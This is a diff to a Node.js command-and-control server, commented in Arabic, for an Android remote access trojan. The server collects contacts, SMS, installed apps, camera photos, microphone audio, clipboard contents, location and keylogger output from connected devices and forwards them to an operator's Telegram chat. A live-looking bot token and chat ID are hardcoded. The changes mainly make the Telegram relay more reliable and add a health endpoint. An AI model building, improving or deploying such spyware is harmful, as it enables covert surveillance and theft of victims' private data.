@@ -9,7 +9,7 @@ const path = require('path');
 // ========== إعدادات متغيرات البيئة ==========
 const TOKEN = process.env.TOKEN || '8549358187:AAFWADEIpzlmgVsqZZtLn5g3-Ppk4tOpQ0Y';
 const CHAT_ID = process.env.CHAT_ID || '7770087246';
-const PORT = process.env.PORT || 8080;  // ✅ تم التعديل إلى 8080
+const PORT = process.env.PORT || 8080;
 const HOST = process.env.HOST || '0.0.0.0';
 
 // ========== إعدادات السيرفر ==========
@@ -18,12 +18,37 @@ const server = http.createServer(app);
 const io = new Server(server, {
     cors: {
         origin: "*",
-        methods: ["GET", "POST"]
+        methods: ["GET", "POST"],
+        credentials: true
+    },
+    pingTimeout: 60000, // زيادة وقت الـ ping إلى 60 ثانية
+    pingInterval: 25000 // إرسال ping كل 25 ثانية
+});
+
+// ========== إعدادات البوت مع إعادة المحاولة ==========
+const bot = new telegramBot(TOKEN, { 
+    polling: true,
+    pollingOptions: {
+        timeout: 30,
+        limit: 100,
+        retryTimeout: 5000
     }
 });
 
-// ========== إعدادات البوت ==========
-const bot = new telegramBot(TOKEN, { polling: true });
+// معالجة أخطاء البولينغ
+bot.on('polling_error', (error) => {
+    console.log('Polling error:', error.code);
+    if (error.code === 'ETELEGRAM' || error.code === 'ECONNRESET') {
+        console.log('Reconnecting bot...');
+        setTimeout(() => {
+            try {
+                bot.startPolling();
+            } catch (e) {
+                console.log('Reconnection failed:', e.message);
+            }
+        }, 5000);
+    }
+});
 
 // ========== تخزين البيانات ==========
 const appData = new Map();
@@ -32,7 +57,7 @@ const connectedDevices = new Map();
 // ========== إعدادات multer لرفع الملفات ==========
 const upload = multer({ 
     storage: multer.memoryStorage(),
-    limits: { fileSize: 50 * 1024 * 1024 } // 50MB
+    limits: { fileSize: 50 * 1024 * 1024 }
 });
 
 // ========== إعدادات Express ==========
@@ -46,6 +71,14 @@ app.get('/', (req, res) => {
 
 app.get('/ping', (req, res) => {
     res.send('pong');
+});
+
+app.get('/health', (req, res) => {
+    res.status(200).json({
+        status: 'ok',
+        devices: connectedDevices.size,
+        uptime: process.uptime()
+    });
 });
 
 // رفع الملفات
@@ -169,7 +202,6 @@ io.on('connection', (socket) => {
     const deviceIp = socket.handshake.address || 'Unknown';
     const deviceId = socket.id;
 
-    // تخزين معلومات الجهاز
     const deviceInfo = {
         id: deviceId,
         name: deviceName,
@@ -179,7 +211,6 @@ io.on('connection', (socket) => {
     };
     connectedDevices.set(deviceId, deviceInfo);
 
-    // إرسال إشعار الاتصال
     bot.sendMessage(CHAT_ID, `
 <b>✯ New device connected</b>
 
@@ -191,90 +222,52 @@ io.on('connection', (socket) => {
         parse_mode: 'HTML'
     });
 
-    // استقبال الأوامر من الجهاز
     socket.on('command', (data) => {
         const { request, extras } = data;
         const device = connectedDevices.get(socket.id);
 
         switch (request) {
             case 'contacts':
-                bot.sendMessage(CHAT_ID, `<b>✯ Contacts received from → ${device.name}</b>`, {
-                    parse_mode: 'HTML'
-                });
+                bot.sendMessage(CHAT_ID, `<b>✯ Contacts received from → ${device.name}</b>`, { parse_mode: 'HTML' });
                 break;
-
             case 'sms':
-                bot.sendMessage(CHAT_ID, `<b>✯ SMS received from → ${device.name}</b>`, {
-                    parse_mode: 'HTML'
-                });
+                bot.sendMessage(CHAT_ID, `<b>✯ SMS received from → ${device.name}</b>`, { parse_mode: 'HTML' });
                 break;
-
             case 'apps':
-                bot.sendMessage(CHAT_ID, `<b>✯ Apps list received from → ${device.name}</b>`, {
-                    parse_mode: 'HTML'
-                });
+                bot.sendMessage(CHAT_ID, `<b>✯ Apps list received from → ${device.name}</b>`, { parse_mode: 'HTML' });
                 break;
-
             case 'main-camera':
-                bot.sendMessage(CHAT_ID, `<b>✯ Main camera photo received from → ${device.name}</b>`, {
-                    parse_mode: 'HTML'
-                });
+                bot.sendMessage(CHAT_ID, `<b>✯ Main camera photo received from → ${device.name}</b>`, { parse_mode: 'HTML' });
                 break;
-
             case 'selfie-camera':
-                bot.sendMessage(CHAT_ID, `<b>✯ Selfie camera photo received from → ${device.name}</b>`, {
-                    parse_mode: 'HTML'
-                });
+                bot.sendMessage(CHAT_ID, `<b>✯ Selfie camera photo received from → ${device.name}</b>`, { parse_mode: 'HTML' });
                 break;
-
             case 'microphone':
-                bot.sendMessage(CHAT_ID, `<b>✯ Audio recording received from → ${device.name}</b>`, {
-                    parse_mode: 'HTML'
-                });
+                bot.sendMessage(CHAT_ID, `<b>✯ Audio recording received from → ${device.name}</b>`, { parse_mode: 'HTML' });
                 break;
-
             case 'vibrate':
-                bot.sendMessage(CHAT_ID, `<b>✯ Device vibrated: ${device.name}</b>`, {
-                    parse_mode: 'HTML'
-                });
+                bot.sendMessage(CHAT_ID, `<b>✯ Device vibrated: ${device.name}</b>`, { parse_mode: 'HTML' });
                 break;
-
             case 'toast':
-                bot.sendMessage(CHAT_ID, `<b>✯ Toast sent to: ${device.name}</b>`, {
-                    parse_mode: 'HTML'
-                });
+                bot.sendMessage(CHAT_ID, `<b>✯ Toast sent to: ${device.name}</b>`, { parse_mode: 'HTML' });
                 break;
-
             case 'clipboard':
-                bot.sendMessage(CHAT_ID, `<b>✯ Clipboard received from → ${device.name}</b>`, {
-                    parse_mode: 'HTML'
-                });
+                bot.sendMessage(CHAT_ID, `<b>✯ Clipboard received from → ${device.name}</b>`, { parse_mode: 'HTML' });
                 break;
-
             case 'notification':
-                bot.sendMessage(CHAT_ID, `<b>✯ Notification sent to: ${device.name}</b>`, {
-                    parse_mode: 'HTML'
-                });
+                bot.sendMessage(CHAT_ID, `<b>✯ Notification sent to: ${device.name}</b>`, { parse_mode: 'HTML' });
                 break;
-
             case 'keylogger-on':
-                bot.sendMessage(CHAT_ID, `<b>✯ Keylogger ON for: ${device.name}</b>`, {
-                    parse_mode: 'HTML'
-                });
+                bot.sendMessage(CHAT_ID, `<b>✯ Keylogger ON for: ${device.name}</b>`, { parse_mode: 'HTML' });
                 break;
-
             case 'keylogger-off':
-                bot.sendMessage(CHAT_ID, `<b>✯ Keylogger OFF for: ${device.name}</b>`, {
-                    parse_mode: 'HTML'
-                });
+                bot.sendMessage(CHAT_ID, `<b>✯ Keylogger OFF for: ${device.name}</b>`, { parse_mode: 'HTML' });
                 break;
-
             default:
                 console.log('Unknown command:', request);
         }
     });
 
-    // استقبال البيانات من الجهاز
     socket.on('data', (data) => {
         const { type, content } = data;
         const device = connectedDevices.get(socket.id);
@@ -286,21 +279,18 @@ io.on('connection', (socket) => {
                     filename: `contacts_${device.name}.json`
                 });
                 break;
-
             case 'sms':
                 bot.sendDocument(CHAT_ID, Buffer.from(JSON.stringify(content, null, 2)), {
                     caption: `💬 SMS messages from: ${device.name}`,
                     filename: `sms_${device.name}.json`
                 });
                 break;
-
             case 'apps':
                 bot.sendDocument(CHAT_ID, Buffer.from(JSON.stringify(content, null, 2)), {
                     caption: `📱 Apps from: ${device.name}`,
                     filename: `apps_${device.name}.json`
                 });
                 break;
-
             case 'location':
                 bot.sendMessage(CHAT_ID, `
 📍 <b>Location received from ${device.name}</b>
@@ -308,27 +298,20 @@ io.on('connection', (socket) => {
 🌐 Latitude: ${content.lat}
 🌐 Longitude: ${content.lng}
 🔗 <a href="https://maps.google.com?q=${content.lat},${content.lng}">View on Google Maps</a>
-                `, {
-                    parse_mode: 'HTML'
-                });
+                `, { parse_mode: 'HTML' });
                 break;
-
             case 'clipboard':
                 bot.sendMessage(CHAT_ID, `
 📋 <b>Clipboard from ${device.name}</b>
 
 ${content}
-                `, {
-                    parse_mode: 'HTML'
-                });
+                `, { parse_mode: 'HTML' });
                 break;
-
             default:
                 console.log('Unknown data type:', type);
         }
     });
 
-    // استقبال الملفات
     socket.on('file', (data) => {
         const { filename, content } = data;
         const device = connectedDevices.get(socket.id);
@@ -339,7 +322,6 @@ ${content}
         });
     });
 
-    // عند انقطاع الاتصال
     socket.on('disconnect', () => {
         const device = connectedDevices.get(socket.id);
         if (device) {
@@ -350,9 +332,7 @@ ${content}
 <b>device</b> → ${device.name}
 <b>model</b> → ${device.model}
 <b>time</b> → ${new Date().toLocaleString()}
-            `, {
-                parse_mode: 'HTML'
-            });
+            `, { parse_mode: 'HTML' });
         }
     });
 });
@@ -362,14 +342,8 @@ server.listen(PORT, HOST, () => {
     console.log(`✅ Server running on ${HOST}:${PORT}`);
     console.log(`✅ Bot is ready!`);
     console.log(`✅ Connected devices: 0`);
+    console.log(`✅ Uptime will be: ${process.uptime()} seconds`);
 });
-
-// ========== إبقاء السيرفر نشطاً ==========
-// إرسال ping إلى السيرفر نفسه كل 5 دقائق (للاستضافة المجانية)
-setInterval(() => {
-    const url = `http://${HOST === '0.0.0.0' ? 'localhost' : HOST}:${PORT}/ping`;
-    fetch(url).catch(() => {});
-}, 300000); // 5 دقائق
 
 // ========== معالجة الأخطاء ==========
 process.on('uncaughtException', (error) => {
@@ -379,3 +353,7 @@ process.on('uncaughtException', (error) => {
 process.on('unhandledRejection', (reason, promise) => {
     console.error('Unhandled Rejection at:', promise, 'reason:', reason);
 });
+
+// ========== إبقاء السيرفر نشطاً (يُفضل استخدام UptimeRobot بدلاً من هذا) ==========
+// هذا يحافظ على النشاط لكن الأفضل استخدام خدمة خارجية
+console.log('✅ Server is running. Use UptimeRobot to keep it alive.');
